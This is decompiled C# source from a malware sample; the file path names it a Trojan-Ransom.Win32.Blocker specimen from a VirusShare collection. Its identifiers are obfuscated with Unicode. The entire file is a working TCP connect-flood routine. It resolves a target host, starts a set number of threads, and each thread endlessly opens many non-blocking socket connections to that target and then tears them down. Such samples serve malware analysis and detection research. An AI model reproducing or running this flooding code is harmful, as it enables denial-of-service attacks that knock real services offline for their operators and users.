// Decompiled with JetBrains decompiler
// Type: ᥰ䪜꼷篍䭦航
// Assembly: stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA9A5647-A48B-43F0-8A2B-5C455466EE1E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.hzrg-622e9302a6f8c01ab665fedaee6c687ed2024544f390b81ebb941db7afbfa850.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

internal class ᥰ䪜꼷\uF092篍䭦\uF08B航
{
  private static ThreadStart[] 裑\u2485짘䢰\uF260Ꮕ㨃ꥁ;
  private static Thread[] Ϫ\u0BAD웽\u1B7D泘ⷭ媳ⶉ;
  public static string 篔懩幵瑴\u2902\u27F3싟鷦;
  private static IPEndPoint 풼䁭힛崘\u2B15춸경촿;
  public static int 堙礋譲ྰꔭ詘薮\uFFFD;
  private static ᥰ䪜꼷\uF092篍䭦\uF08B航.쨊쾭䜭䐭劰灀ꇘ\uF1FA[] 께뤻K屔強캝뺹\uF2A4;
  public static int 㛌Ⳍ\uFFFDϔ脬뺊䎂羠;
  public static int \uFE27䒎챦聶ᄣ虔唔\u25C5;

  public static void \u0CCD揂\uE35C벌읬翐ᬆ\u171A()
  {
    try
    {
      ᥰ䪜꼷\uF092篍䭦\uF08B航.풼䁭힛崘\u2B15춸경촿 = new IPEndPoint(Dns.GetHostEntry(ᥰ䪜꼷\uF092篍䭦\uF08B航.篔懩幵瑴\u2902\u27F3싟鷦).AddressList[0], ᥰ䪜꼷\uF092篍䭦\uF08B航.堙礋譲ྰꔭ詘薮\uFFFD);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ᥰ䪜꼷\uF092篍䭦\uF08B航.풼䁭힛崘\u2B15춸경촿 = new IPEndPoint(IPAddress.Parse(ᥰ䪜꼷\uF092篍䭦\uF08B航.篔懩幵瑴\u2902\u27F3싟鷦), ᥰ䪜꼷\uF092篍䭦\uF08B航.堙礋譲ྰꔭ詘薮\uFFFD);
      ProjectData.ClearProjectError();
    }
    ᥰ䪜꼷\uF092篍䭦\uF08B航.Ϫ\u0BAD웽\u1B7D泘ⷭ媳ⶉ = new Thread[checked (ᥰ䪜꼷\uF092篍䭦\uF08B航.\uFE27䒎챦聶ᄣ虔唔\u25C5 - 1 + 1)];
    ᥰ䪜꼷\uF092篍䭦\uF08B航.裑\u2485짘䢰\uF260Ꮕ㨃ꥁ = new ThreadStart[checked (ᥰ䪜꼷\uF092篍䭦\uF08B航.\uFE27䒎챦聶ᄣ虔唔\u25C5 - 1 + 1)];
    ᥰ䪜꼷\uF092篍䭦\uF08B航.께뤻K屔強캝뺹\uF2A4 = new ᥰ䪜꼷\uF092篍䭦\uF08B航.쨊쾭䜭䐭劰灀ꇘ\uF1FA[checked (ᥰ䪜꼷\uF092篍䭦\uF08B航.\uFE27䒎챦聶ᄣ虔唔\u25C5 - 1 + 1)];
    int num = checked (ᥰ䪜꼷\uF092篍䭦\uF08B航.\uFE27䒎챦聶ᄣ虔唔\u25C5 - 1);
    int index = 0;
    while (index <= num)
    {
      ᥰ䪜꼷\uF092篍䭦\uF08B航.께뤻K屔強캝뺹\uF2A4[index] = new ᥰ䪜꼷\uF092篍䭦\uF08B航.쨊쾭䜭䐭劰灀ꇘ\uF1FA(ᥰ䪜꼷\uF092篍䭦\uF08B航.풼䁭힛崘\u2B15춸경촿, ᥰ䪜꼷\uF092篍䭦\uF08B航.㛌Ⳍ\uFFFDϔ脬뺊䎂羠);
      ᥰ䪜꼷\uF092篍䭦\uF08B航.裑\u2485짘䢰\uF260Ꮕ㨃ꥁ[index] = new ThreadStart(ᥰ䪜꼷\uF092篍䭦\uF08B航.께뤻K屔強캝뺹\uF2A4[index].즏\u0BDE쏧\uFFFD妴䦆퍲詚);
      ᥰ䪜꼷\uF092篍䭦\uF08B航.Ϫ\u0BAD웽\u1B7D泘ⷭ媳ⶉ[index] = new Thread(ᥰ䪜꼷\uF092篍䭦\uF08B航.裑\u2485짘䢰\uF260Ꮕ㨃ꥁ[index]);
      ᥰ䪜꼷\uF092篍䭦\uF08B航.Ϫ\u0BAD웽\u1B7D泘ⷭ媳ⶉ[index].Start();
      checked { ++index; }
    }
  }

  public static void 육Ɦ쵺僑躕듀န\uE7D8()
  {
    int num = checked (ᥰ䪜꼷\uF092篍䭦\uF08B航.\uFE27䒎챦聶ᄣ虔唔\u25C5 - 1);
    int index = 0;
    while (index <= num)
    {
      try
      {
        ᥰ䪜꼷\uF092篍䭦\uF08B航.Ϫ\u0BAD웽\u1B7D泘ⷭ媳ⶉ[index].Abort();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      checked { ++index; }
    }
  }

  private class 쨊쾭䜭䐭劰灀ꇘ\uF1FA
  {
    private IPEndPoint 풼䁭힛崘\u2B15춸경촿;
    private Socket[] 機놊䉞藗ￛ핥찻审;
    private int 㛌Ⳍ\uFFFDϔ脬뺊䎂羠;

    public 쨊쾭䜭䐭劰灀ꇘ\uF1FA(IPEndPoint _param1, int _param2)
    {
      this.풼䁭힛崘\u2B15춸경촿 = _param1;
      this.㛌Ⳍ\uFFFDϔ脬뺊䎂羠 = _param2;
    }

    public void 髱\uF12D츿\uA70F鳩丳\uFDEB鹙(IAsyncResult _param1)
    {
    }

    public void 즏\u0BDE쏧\uFFFD妴䦆퍲詚()
    {
      while (true)
      {
        try
        {
          this.機놊䉞藗ￛ핥찻审 = new Socket[checked (this.㛌Ⳍ\uFFFDϔ脬뺊䎂羠 - 1 + 1)];
          int num1 = checked (this.㛌Ⳍ\uFFFDϔ脬뺊䎂羠 - 1);
          int index1 = 0;
          while (index1 <= num1)
          {
            this.機놊䉞藗ￛ핥찻审[index1] = new Socket(this.풼䁭힛崘\u2B15춸경촿.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            this.機놊䉞藗ￛ핥찻审[index1].Blocking = false;
            AsyncCallback callback = new AsyncCallback(this.髱\uF12D츿\uA70F鳩丳\uFDEB鹙);
            this.機놊䉞藗ￛ핥찻审[index1].BeginConnect((EndPoint) this.풼䁭힛崘\u2B15춸경촿, callback, (object) this.機놊䉞藗ￛ핥찻审[index1]);
            checked { ++index1; }
          }
          Thread.Sleep(100);
          int num2 = checked (this.㛌Ⳍ\uFFFDϔ脬뺊䎂羠 - 1);
          int index2 = 0;
          while (index2 <= num2)
          {
            if (this.機놊䉞藗ￛ핥찻审[index2].Connected)
              this.機놊䉞藗ￛ핥찻审[index2].Disconnect(false);
            this.機놊䉞藗ￛ핥찻审[index2].Close();
            this.機놊䉞藗ￛ핥찻审[index2] = (Socket) null;
            checked { ++index2; }
          }
          this.機놊䉞藗ￛ핥찻审 = (Socket[]) null;
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          int num = checked (this.㛌Ⳍ\uFFFDϔ脬뺊䎂羠 - 1);
          int index = 0;
          while (index <= num)
          {
            try
            {
              if (this.機놊䉞藗ￛ핥찻审[index].Connected)
                this.機놊䉞藗ￛ핥찻审[index].Disconnect(false);
              this.機놊䉞藗ￛ핥찻审[index].Close();
              this.機놊䉞藗ￛ핥찻审[index] = (Socket) null;
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
